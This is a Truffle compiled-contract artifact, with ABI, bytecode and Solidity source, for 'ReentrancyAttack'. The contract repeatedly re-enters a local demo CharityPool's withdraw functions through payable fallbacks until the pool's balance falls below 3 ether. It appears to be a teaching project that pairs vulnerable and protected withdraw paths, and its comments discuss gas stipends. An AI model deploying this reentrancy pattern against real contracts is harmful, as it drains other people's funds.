{
  "contractName": "ReentrancyAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_charityPool",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "charityPool",
      "outputs": [
        {
          "internalType": "contract CharityPool",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fallback1",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fallback2",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "initiateAttack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "initiateAttack2",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104c73803806104c78339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610433806100946000396000f3fe6080604052600436106100555760003560e01c80636e2ef5c81461005a5780636f9fb98a14610071578063836afd3a1461009c5780638f856eab146100a6578063e0a1f3c8146100fd578063f4a0470c14610114575b600080fd5b34801561006657600080fd5b5061006f61011e565b005b34801561007d57600080fd5b506100866101a1565b6040518082815260200191505060405180910390f35b6100a46101c0565b005b3480156100b257600080fd5b506100bb61028b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561010957600080fd5b506101126102b0565b005b61011c610333565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f7c318056040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561018757600080fd5b505af115801561019b573d6000803e3d6000fd5b50505050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6729a2241af62c00006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610289576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f7c318056040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561027057600080fd5b505af1158015610284573d6000803e3d6000fd5b505050505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635bf9204f6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031957600080fd5b505af115801561032d573d6000803e3d6000fd5b50505050565b6729a2241af62c00006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106103fc576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635bf9204f6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103e357600080fd5b505af11580156103f7573d6000803e3d6000fd5b505050505b56fea265627a7a723158202f8012c09ebbab05fa537374ba7f6d661df59231b20a587faeb223496a10c0fd64736f6c63430005100032",
  "source": "\npragma solidity ^0.5.0;\n\n\nimport './CharityPool.sol';\n\ncontract ReentrancyAttack {\n\n    CharityPool public charityPool;\n\n    constructor(address _charityPool) public {\n        charityPool = CharityPool(_charityPool);\n    }\n\n    function getContractBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    // NOTE: callback function below limited to 2300 gas.  700 to read\n    // .. contract balance, 200 for the if statement, and when withdraw\n    // .. gets called that's another 9000 for it's transfer function, \n    // .. so no good!  SOLUTION, use .call in withdraw\n\n    // function() external payable { (could've used receive()) upgrade version\n        // Fallback limited to 2300 gas.  Costs more gas to load state\n        // .. variables which require storage access. SO, we could\n        // .. use local variables, which require significantly less gas\n        // .. Could do primitives to save even more gas.\n        // (initializing a variable or a bigger value increases gas too.)\n        \n        // uint8 MIN_CHARITY_BALANCE = 3;\n        // uint256 WEI_SCALE = 10**18;\n        // uint256 total = MIN_CHARITY_BALANCE * WEI_SCALE;\n    //     if (address(charityPool).balance >= 3000000000000000000) {\n    //         charityPool.withdraw();\n    //     }\n    // }\n\n    // callback function: Automatically handles\n    // .. incoming Ether and updates the contract's balance.\n    function fallback1() external payable {\n        if (address(charityPool).balance >= 3000000000000000000) {\n            charityPool.failedWithdrawAttack();\n        }\n    }\n\n    function fallback2() external payable {\n        if (address(charityPool).balance >= 3000000000000000000) {\n            charityPool.successfulWithdrawAttack();\n        }\n    }\n\n    function initiateAttack() public {\n        charityPool.failedWithdrawAttack();\n    }\n\n    function initiateAttack2() public {\n        charityPool.successfulWithdrawAttack();\n    }\n\n}\n",
  "sourcePath": "/Users/Nelson/Desktop/DEX-web-app/src/contracts/Hack And Charity Pool/ReentrancyAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-07-22T19:24:49.230Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}